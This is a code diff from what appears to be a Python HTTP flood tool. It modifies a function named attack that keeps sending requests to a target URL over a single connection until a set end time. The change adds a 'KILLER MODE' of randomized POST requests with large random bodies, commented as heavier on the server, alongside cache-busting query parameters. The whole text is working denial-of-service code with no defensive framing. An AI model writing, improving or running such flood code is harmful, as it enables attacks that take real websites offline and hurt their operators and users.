@@ -99,23 +99,37 @@ def attack(target_url, end_time, thread_id, port, mode):
             s.connect((host, target_port))
             
             # 2. INFINITE FLOOD on Single Connection
-            # Don't stop until broken or timeout
             while time.time() < end_time:
                 
                 # Fast Path Selection
                 curr_path = path
+                method = "GET"
+                post_data = ""
+                
                 if mode == '3' or mode == '4':
-                    # Pick from pool instead of generating (CPU Optimization)
                     rnd = RANDOM_POOL[TOTAL_REQUESTS % 1000]
                     sep = '&' if '?' in curr_path else '?'
                     curr_path = f"{path}{sep}t={rnd}"
                 
-                # Construct Payload (Fastest String Concat)
-                payload = (
-                    f"GET {curr_path} HTTP/1.1\r\n" +
-                    common_headers +
-                    "\r\n"
-                ).encode('utf-8')
+                # KILLER MODE: Randomized POST (Much heavier than GET)
+                if mode == '4' and TOTAL_REQUESTS % 2 == 0:
+                    method = "POST"
+                    post_data = get_random_string(random.randint(500, 2000)) # Heavy Body
+                
+                # Construct Payload
+                payload_str = (
+                    f"{method} {curr_path} HTTP/1.1\r\n" +
+                    common_headers
+                )
+                
+                if method == "POST":
+                    payload_str += f"Content-Length: {len(post_data)}\r\n"
+                    payload_str += "Content-Type: application/x-www-form-urlencoded\r\n"
+                    payload_str += "\r\n" + post_data
+                else:
+                    payload_str += "\r\n"
+
+                payload = payload_str.encode('utf-8')
 
                 # Send
                 s.sendall(payload)
